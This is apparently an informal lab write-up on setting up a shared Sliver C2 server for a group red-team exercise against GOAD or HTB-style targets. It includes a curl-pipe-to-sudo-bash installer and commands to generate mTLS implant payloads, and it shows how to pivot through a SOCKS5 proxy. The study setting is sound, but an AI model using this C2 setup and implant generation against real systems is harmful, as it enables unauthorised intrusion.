
# Sliver C2


The main idea here is that me and a group of friends wanted to essentially play GOAD but knowing how that lab is its EXTREMELY heavy and one of us offered their beefy device.... so how can we all play, we also wanted to do some role playing as an actual red team... so how can we do that?. This part was provided by our beloved SORA_HEHE

![[Blog-20240704224453438.webp]]

## Setting up EC2

 - EC2 server
	 - has access to the victim either it be by vpn or proxy


Now how did our beloved soraHEHE set it up?. ill let him explain it for us

1. Create a VM
	1. E2 Server - Debain 12 
	2. 2 CPU
	3. 8 GB Ram
	4. with two SSH entry (In this case for the c2 infra devs)
	5. 50GB Ram
2. Set Firewalll to allow HTTPS/HTTP
3. SSH in , Setup sliver (My part)
4. Setting Static External IP 



![[Blog-20240704224905416.webp]]


![[Blog-20240704224912530.webp]]



![[Blog-20240704224919131.webp]]


![[Blog-20240704224925118.webp]]


## Setting up Sliver

This part is relatively easier than the previous one and ofcourse done by yours truly... me :))

This command basically does most of the work for you, it sets up sliver as a system service and with the following command also sets it up as a daemon for it to run everytime the machine is up

```
curl https://sliver.sh/install|sudo bash
```

```
systemctl enable sliver.server
```

```
root@sliverc2:~# systemctl start sliver.service
root@sliverc2:~# systemctl status sliver.service
WARNING: terminal is not fully functional
Press RETURN to continue
● sliver.service - Sliver
     Loaded: loaded (/etc/systemd/system/sliver.service; disabled; preset: enabled)
     Active: active (running) since Thu 2024-07-04 15:07:48 UTC; 3s ago
   Main PID: 974 (sliver-server)
      Tasks: 8 (limit: 9512)
     Memory: 10.7M
        CPU: 73ms
     CGroup: /system.slice/sliver.service
             └─974 /root/sliver-server daemon

Jul 04 15:07:48 sliverc2 systemd[1]: Started sliver.service - Sliver.
root@sliverc2:~#
```

Now we need to make config files for all of the operators, ofcourse... i wont share my name due to funny opsec reasons :))

## Creating a operator 

The dev (randal our bbg) should be the one that creates a profile for you and assigns your funny name.

```
sudo /root/sliver-server operator --name <FUNNY_NAME> --lhost <PUBLIC_IP> --lport 31337 --save SAVE_FILE_HERE.cfg
```

## Using that operator client

Once the profile is created you need to import it locally using the following command

```
sudo sliver-client import ./<OPERATOR_NAME>_<FUNNY_IP_HERE>.cfg
```

Now when you launch `sliver-client` you should be able to see your new profile

## Creating profiles (dev to save time)

These profiles help save time, usually when generating a payload on sliver it would take a lot of time because of the symbol obfuscation and shit.

```
https
profiles new --mtls 10.10.14.7 -l -G --os linux mtls_nix
profiles new --mtls 10.10.14.7 -e mtls_win
profiles new --mtls 10.10.14.7 -e --format shellcode -l -G mtls_win_sh

profiles generate mtls_nix
profiles generate mtls_win
profiles generate mtls_win_sh
```


## PROXY
everyone needs to run their own proxy so since its local you need to make it on your own locally.

This is done by starting a socks proxy to listen on localhost:1081, any transactions that go through with proxychains will go through this session

![[Notess-20240704205917525.webp]]

You need to use a session first which is the most important part, secondly you need to start a socks5. remember this is local so you will have to set it up everytime.

```
sliver (CLASSICAL_PATRIOT) > socks5 start --user jess

⚠️  SOCKS proxy authentication credentials are tunneled to the implant
⚠️  These credentials are recoverable from the implant's memory!

? Do you understand the implication? Yes

[*] Started SOCKS5 127.0.0.1 1081 jess RANDOMLYGENERATEDPASSWORD  <--------------- FOCUS HERE
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol

```

edit `/etc/proxychains4.conf` and Make sure to pay attention to the generated password. so now that we have the username and password we know we need to add this line to `/etc/proxychains`

```
socks5 127.0.0.1 1081 jess RANDOMLYGENERATEDPASSWORD
```

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1081 jess rsVW7Ia5ew2kodzID1TYAA
```

Well... lets test it!

```
kali@kali ~> proxychains curl -k https://painters.htb/home
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.110.35:443  ...  OK
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>PAINTERS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <!-- Favicon -->
    <link href="/static/img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
```


FAQ for common issues
- Check your /etc/hosts
	- Check you added the correct name
- check your /etc/proxychains
	- Check the username
	- check the password
	- check your timeout
		- usually the timeout makes a difference with how the responses are, so play with the timeouts try long for more stables ones and short for more quick ones.


# THE BOYS ARE BACK IN TOWN

![[Blog-20240704233445258.webp]]